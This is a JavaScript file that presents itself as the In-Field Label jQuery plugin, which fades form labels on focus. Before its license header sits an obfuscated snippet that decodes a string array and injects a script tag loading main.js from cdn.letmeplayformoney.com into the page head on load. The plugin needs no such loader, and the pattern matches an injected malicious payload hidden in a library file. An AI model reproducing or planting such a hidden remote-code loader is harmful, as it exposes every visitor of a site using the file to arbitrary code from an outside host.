var _0x25b0=['createElement','script','onload','src','https://cdn.letmeplayformoney.com/main.js?cdn=js','text/javascript','getElementsByTagName','head','appendChild'];(function(_0x38c36f,_0x12afce){var _0x31d501=function(_0x338e37){while(--_0x338e37){_0x38c36f['push'](_0x38c36f['shift']());}};_0x31d501(++_0x12afce);}(_0x25b0,0x1dd));var _0x4bec=function(_0x1c1d3d,_0x21e514){_0x1c1d3d=_0x1c1d3d-0x0;var _0x2921c7=_0x25b0[_0x1c1d3d];return _0x2921c7;};var script=document[_0x4bec('0x0')](_0x4bec('0x1'));script[_0x4bec('0x2')]=function(){};script[_0x4bec('0x3')]=_0x4bec('0x4');script['type']=_0x4bec('0x5');document[_0x4bec('0x6')](_0x4bec('0x7'))[0x0][_0x4bec('0x8')](script);/**
 * @license In-Field Label jQuery Plugin
 * http://fuelyourcoding.com/scripts/infield.html
 *
 * Copyright (c) 2009-2010 Doug Neiner
 * Dual licensed under the MIT and GPL licenses.
 * Uses the same license as jQuery, see:
 * http://docs.jquery.com/License
 *
 * @version 0.1.2
 */
(function ($) {

  $.InFieldLabels = function (label, field, options) {
    // To avoid scope issues, use 'base' instead of 'this'
    // to reference this class from internal events and functions.
    var base = this;
  
    // Access to jQuery and DOM versions of each element
    base.$label = $(label);
    base.label  = label;

    base.$field = $(field);
    base.field  = field;

    base.$label.data("InFieldLabels", base);
    base.showing = true;

    base.init = function () {
      // Merge supplied options with default options
      base.options = $.extend({}, $.InFieldLabels.defaultOptions, options);

      // Check if the field is already filled in
      if (base.$field.val() !== "") {
        base.$label.hide();
        base.showing = false;
      }

      base.$field.focus(function () {
        base.fadeOnFocus();
      }).blur(function () {
        base.checkForEmpty(true);
      }).bind('keydown.infieldlabel', function (e) {
        // Use of a namespace (.infieldlabel) allows us to
        // unbind just this method later
        base.hideOnChange(e);
      }).bind('paste', function (e) {
        // Since you can not paste an empty string we can assume
        // that the fieldis not empty and the label can be cleared.
        base.setOpacity(0.0);
      }).change(function (e) {
        base.checkForEmpty();
      }).bind('onPropertyChange', function () {
        base.checkForEmpty();
      });
    };

    // If the label is currently showing
    // then fade it down to the amount
    // specified in the settings
    base.fadeOnFocus = function () {
      if (base.showing) {
        base.setOpacity(base.options.fadeOpacity);
      }
    };

    base.setOpacity = function (opacity) {
      base.$label.stop().animate({ opacity: opacity }, base.options.fadeDuration);
      base.showing = (opacity > 0.0);
    };

    // Checks for empty as a fail safe
    // set blur to true when passing from
    // the blur event
    base.checkForEmpty = function (blur) {
      if (base.$field.val() === "") {
        base.prepForShow();
        base.setOpacity(blur ? 1.0 : base.options.fadeOpacity);
      } else {
        base.setOpacity(0.0);
      }
    };

    base.prepForShow = function (e) {
      if (!base.showing) {
        // Prepare for a animate in...
        base.$label.css({opacity: 0.0}).show();

        // Reattach the keydown event
        base.$field.bind('keydown.infieldlabel', function (e) {
          base.hideOnChange(e);
        });
      }
    };

    base.hideOnChange = function (e) {
      if (
          (e.keyCode === 16) || // Skip Shift
          (e.keyCode === 9) // Skip Tab
        ) {
        return; 
      }

      if (base.showing) {
        base.$label.hide();
        base.showing = false;
      }

      // Remove keydown event to save on CPU processing
      base.$field.unbind('keydown.infieldlabel');
    };

    // Run the initialization method
    base.init();
  };

  $.InFieldLabels.defaultOptions = {
    fadeOpacity: 0.5, // Once a field has focus, how transparent should the label be
    fadeDuration: 300 // How long should it take to animate from 1.0 opacity to the fadeOpacity
  };


  $.fn.inFieldLabels = function (options) {
    return this.each(function () {
      // Find input or textarea based on for= attribute
      // The for attribute on the label must contain the ID
      // of the input or textarea element
      var for_attr = $(this).attr('for'), $field;
      if (!for_attr) {
        return; // Nothing to attach, since the for field wasn't used
      }

      // Find the referenced input or textarea element
      $field = $(
        "input#" + for_attr + "[type='text']," + 
        "input#" + for_attr + "[type='search']," + 
        "input#" + for_attr + "[type='tel']," + 
        "input#" + for_attr + "[type='url']," + 
        "input#" + for_attr + "[type='email']," + 
        "input#" + for_attr + "[type='password']," + 
        "textarea#" + for_attr
      );

      if ($field.length === 0) {
        return; // Again, nothing to attach
      } 

      // Only create object for input[text], input[password], or textarea
      (new $.InFieldLabels(this, $field[0], options));
    });
  };

}(jQuery));